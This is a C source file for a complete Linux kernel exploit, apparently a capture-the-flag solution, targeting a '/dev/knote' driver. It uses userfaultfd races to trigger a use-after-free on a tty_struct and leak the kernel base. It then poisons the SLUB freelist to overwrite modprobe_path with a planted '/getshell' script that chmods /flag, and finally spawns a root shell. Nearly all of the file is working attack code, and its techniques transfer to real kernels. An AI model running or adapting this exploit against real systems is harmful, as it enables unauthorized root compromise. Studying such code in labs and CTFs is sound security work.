#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include "kernelpwn.h"

#define DO_SAK_WORK 0xffffffff815d4ef0
#define MODPROBE_PATH 0xffffffff8245c5c0

#define TTY_STRUCT_SIZE 0x2e0

static char cat_flag[] = "#!/bin/sh\nchmod 777 /flag\n";

static long page_size;
static sem_t sem_add, sem_edit;
static char * buf; // for userfaultfd

static char *page = NULL;
static void *
fault_handler_thread(void *arg)
{
	struct uffd_msg msg;
	int fault_cnt = 0;
	long uffd;

	struct uffdio_copy uffdio_copy;
	ssize_t nread;

	uffd = (long) arg;

	for (;;) {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        
        if (nready == -1) {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));
        
        sleep(10);
        
        if (nread == 0) {
            err_exit("EOF on userfaultfd!\n");
        }

        if (nread == -1) {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            err_exit("Unexpected event on userfaultfd\n");
        }

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
            err_exit("ioctl-UFFDIO_COPY");
        }

        return NULL;
	}
}

typedef struct
{
    union {
        size_t size;
        size_t index;
    };
    char * buf;
} Chunk;

long knote_fd;

void chunkAdd(size_t size)
{
    Chunk chunk = {
        .size = size,
    };
    ioctl(knote_fd, 0x1337, &chunk);
}

void chunkEdit(size_t index, char * buf)
{
    Chunk chunk = {
        .index = index,
        .buf = buf,
    };
    ioctl(knote_fd, 0x8888, &chunk);
}

void chunkGet(size_t index, char * buf)
{
    Chunk chunk = {
        .index = index,
        .buf = buf,
    };
    ioctl(knote_fd, 0x2333, &chunk);
}

void chunkDel(size_t index)
{
    Chunk chunk = {
        .index = index,
    };
    ioctl(knote_fd, 0x6666, &chunk);
}

int main(int argc, char ** argv, char ** envp)
{
    int tty_fd, pid, fd;
    size_t modprobe_path, temp[0x100];
    char * buf2, flag[0x100];
    FILE * file = NULL;
    cpu_set_t cpu_set;
    pthread_t th1, th2;

    bind_core(0);
    save_status();

    page_size = sysconf(_SC_PAGE_SIZE);

    buf = (char*) mmap(NULL, 0x1000, 
                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
                       -1, 0);
    buf2 = (char*) mmap(NULL, 0x1000,
                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
                        -1, 0);
    page = malloc(0x1000);
    memset(page, 'A', 0x1000);
    strcpy(page, "arttnba3");

    /* create evil script */
    fd = open("/getshell", O_RDWR | O_CREAT);
    write(fd, cat_flag, sizeof(cat_flag));
    close(fd);
    system("chmod +x /getshell");

    /* register userfaultfd */
    register_userfaultfd(&th1, buf, 0x1000, fault_handler_thread);
    register_userfaultfd(&th2, buf2, 0x1000, fault_handler_thread);

    knote_fd = open("/dev/knote", O_RDWR);

    /* read saved data(if existed) */
    fd = open("kernel_addr.txt", O_RDWR);
    if (fd > 0) {
        close(fd);
        file = fopen("/kernel_addr.txt", "r");
        if (file) {
            fscanf(file, "%lx %lx", &kernel_base, &kernel_offset);
            goto exploit;
        }
    }

    /* leak kernel base from tty struct by reading a free chunk */
    chunkAdd(TTY_STRUCT_SIZE);
    pid = fork();
    if (pid < 0) {
        err_exit("FAILED to fork the child");
    }
    else if (pid == 0) { /* child to free the chunk */
        puts("[\033[34m\033[1m*\033[0m] Chile process sleeping now...");
        sleep(2);
        puts("[\033[34m\033[1m*\033[0m] Chile process started.");
        chunkDel(0);
        sleep(1);
        tty_fd = open("/dev/ptmx", O_RDWR);
        puts("[\033[34m\033[1m*\033[0m] Object free and tty got open."
             "Backing parent thread...");
        exit(0);
    }
    else {
        puts("[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd");
        chunkGet(0, buf);
    }

    /* leak kernel data */
    if (*((unsigned long long*)(buf) + 86)) {
        puts("[\033[32m\033[1m+\033[0m] Successfully hit the tty_struct.");
    }
    else {
        err_exit("Failed to hit the tty struct.");
    }

    kernel_offset = *((unsigned long long*)(buf) + 86) - DO_SAK_WORK;
    kernel_base = kernel_base + kernel_offset;
    
    file = fopen("/kernel_addr.txt", "w");
    if (!file) {
        err_exit("Unable to create temp file.");
    }
    fprintf(file, "%lx %lx", kernel_base, kernel_offset);
    fclose(file);

exploit:
    modprobe_path = MODPROBE_PATH + kernel_offset;
    printf("[\033[34m\033[1m*\033[0m] Kernel offset: 0x%lx\n", kernel_offset);
    printf("[\033[32m\033[1m+\033[0m] Kernel base: 0x%lx\n", kernel_base);
    printf("[\033[32m\033[1m+\033[0m] modprobe_path: 0x%lx\n", modprobe_path);

    /* hijack the freelist in slub */
    chunkAdd(0x100);
    memcpy(page, &modprobe_path, 8); /* object->next */
    memcpy(((unsigned long long*)(page) + 1), "arttnba3", 8);
    pid = fork();
    if (pid < 0) {
        err_exit("FAILED to fork the child");
    }
    else if (pid == 0) { /* child to free the chunk */
        puts("[\033[34m\033[1m*\033[0m] Chile process sleeping now...");
        sleep(2);
        puts("[\033[34m\033[1m*\033[0m] Chile process started.");
        chunkDel(0);
        puts("[\033[34m\033[1m*\033[0m] Object free and tty got open."
             "Backing parent thread...");
        exit(0);
    } else {
        puts("[\033[34m\033[1m*\033[0m] Parent process trapped in userfaultfd");
        chunkEdit(0, buf2);
    }

    /* hijack the modprobe_path */
    chunkAdd(0x100);
    chunkAdd(0x100);
    chunkEdit(1, "/getshell");

    /* trigger the modprobe_path */
    system("echo -e '\\xff\\xff\\xff\\xff' > /fake");
    system("chmod +x /fake");
    system("/fake");

    /* get flag */
    sleep(1);
    fd = open("/flag", O_RDWR);
    if (fd < 0) {
        err_exit("FAILED to hijack!");
    }
    read(fd, flag, 0x100);
    write(1, flag, 0x100);
    system("/bin/sh");

    return 0;
}